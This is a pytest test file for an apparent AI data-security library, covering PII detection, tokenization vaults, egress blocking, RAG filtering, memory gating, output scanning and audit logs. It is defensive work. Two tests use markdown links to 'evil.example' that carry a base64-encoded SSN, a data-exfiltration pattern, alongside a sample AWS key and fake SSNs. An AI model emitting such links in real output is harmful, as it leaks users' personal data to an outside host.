from datetime import date

import pytest

from ai_data_security.audit import AuditLog, ValueInAuditRecord
from ai_data_security.detect import (Finding, house_analyzer,
                                     resolve_overlaps, scan_record, scan_text)
from ai_data_security.memory import MemoryGate
from ai_data_security.output import StreamScanner, guard_links, scan_output
from ai_data_security.policy import (Context, Decision, decide, decide_strict,
                                     purpose_for)
from ai_data_security.rag import Chunk, search, search_then_filter
from ai_data_security.vault import Vault, reveal_ladder
from ai_data_security.wire import Blocked, guarded_tool


# -- detect -------------------------------------------------------------------
def test_field_names_are_never_scanned_as_data():
    found = scan_record({"date_of_birth": "04/12/1985"})
    assert [f.entity_type for f in found] == ["DATE_TIME"]
    assert found[0].score == 0.95                    # context restored


def test_house_formats_and_secrets():
    types = {f.entity_type for f in scan_text(
        "CUST-88231 key AKIAIOSFODNN7EXAMPLE mail ops@acme.internal")}
    assert {"CUSTOMER_ID", "SECRET", "EMAIL_ADDRESS"} <= types


def test_same_span_overlap_keeps_one():
    a = Finding("", "US_SSN", "900-77-3301", 0.85, 4, 15)
    b = Finding("", "US_ITIN", "900-77-3301", 0.5, 4, 15)
    assert resolve_overlaps([b, a]) == [a]


# -- vault --------------------------------------------------------------------
def test_tokenize_keeps_trailing_punctuation_on_overlap():
    v, text = Vault(), "SSN 900-77-3301."
    safe, _ = v.tokenize(text, scan_text(text), "t")
    assert safe == "SSN US_SSN_001."


def test_reveal_is_scoped_and_whole_token():
    v = Vault()
    for n in range(1, 1001):
        v.token_for("t:a", "PERSON", f"P{n}x")
    assert v.reveal("PERSON_1000", "t:a", "c") == "P1000x"
    assert v.reveal("PERSON_1000", "t:b", "c") == "PERSON_1000"


def test_reveal_refuses_tokens_not_in_request():
    events = []
    v = Vault(audit=events.append)
    v.token_for("s", "PERSON", "Maria Garcia")
    given = {v.token_for("s", "PERSON", "John Smith")}
    out = v.reveal("PERSON_001 and PERSON_002", "s", "c", allowed=given)
    assert out == "PERSON_001 and John Smith"
    assert events[0]["outcome"] == "refused_not_in_request"
    assert all("Maria" not in str(e) for e in events)   # audit holds no value


def test_forget_breaks_the_link():
    v = Vault()
    tok = v.token_for("s", "PERSON", "Priya Shah")
    assert v.forget("s", "Priya Shah") == 1
    assert v.reveal(tok, "s", "c") == tok


def test_ladder():
    assert reveal_ladder(date(1985, 4, 12), "boolean",
                         date(2026, 9, 20)) == "is over 18: yes"


# -- wire, rag, memory ----------------------------------------------------------
def test_guarded_tool_can_block_egress():
    def policy(tool, direction, findings, payload):
        if direction == "egress":
            raise Blocked(tool, direction, "PII to third party")
        return payload
    search = guarded_tool("search_vendor", lambda query: {}, policy)
    with pytest.raises(Blocked):
        search(query="John Smith 555-123-4567 refund")


def test_filter_inside_search_fills_every_slot():
    chunks = [Chunk(f"r{i}", "salary review band", "restricted")
              for i in range(3)] + [Chunk("ok", "salary questions", "internal"),
                                    Chunk("nolabel", "salary draft")]
    inside = search("salary review band", chunks, {"internal"}, k=3)
    after = search_then_filter("salary review band", chunks, {"internal"}, k=3)
    assert [c.id for c in inside] == ["ok"]
    assert after == []                               # restricted took the slots


def test_memory_gate_refuses_health_topics():
    gate = MemoryGate(Vault(), "u")
    assert gate.remember("Priya Shah mentioned a cardiac procedure.") is None
    assert gate.remember("Priya Shah prefers email.") == "PERSON_001 prefers email."


# -- output -----------------------------------------------------------------------
def test_stream_scanner_catches_split_value():
    s = StreamScanner()
    parts = ["The customer's SSN is 900", "-12-", "3456 and that is all ",
             "for today, thanks."]
    text = "".join(s.feed(p) for p in parts) + s.close()
    assert "900-12-3456" not in text and "<US_SSN>" in text


def test_link_guard_drops_unknown_hosts():
    out, removed = guard_links("x ![a](https://evil.example/p?d=OTAw) y "
                               "[doc](https://intranet.example.com/d)",
                               {"intranet.example.com"})
    assert removed == ["evil.example"] and "intranet" in out


def test_output_scanner_alone_misses_encoded_links():
    _, found = scan_output("[r](https://evil.example/r?id=OTAwLTEyLTM0NTY=)")
    assert found == []


# -- policy, audit --------------------------------------------------------------------
def ctx(**kw):
    base = dict(user="u", role="r", agent="support", tool="t",
                entity_type="US_SSN", purpose="order_lookup",
                destination="internal")
    return Context(**{**base, **kw})


def test_purpose_is_bound_to_entry_point():
    c = ctx(agent="analytics",
            purpose=purpose_for("/analytics/run", claimed="fraud_check"))
    assert decide(c).action == "block"


def test_strict_policy_fails_closed():
    assert decide(ctx(agent="new-bot")).action == "tokenize"
    assert decide_strict(ctx(agent="new-bot")).action == "block"


def test_audit_refuses_value_and_answers_by_subject():
    log = AuditLog()
    log.record(ctx(), decide(ctx()), "PERSON_001",
               protected_values=("900-12-3456",))
    with pytest.raises(ValueInAuditRecord):
        log.record(ctx(), Decision("allow", "sent 900-12-3456"),
                   "PERSON_001", protected_values=("900-12-3456",))
    assert len(log.by_subject("PERSON_001", "US_SSN")) == 1
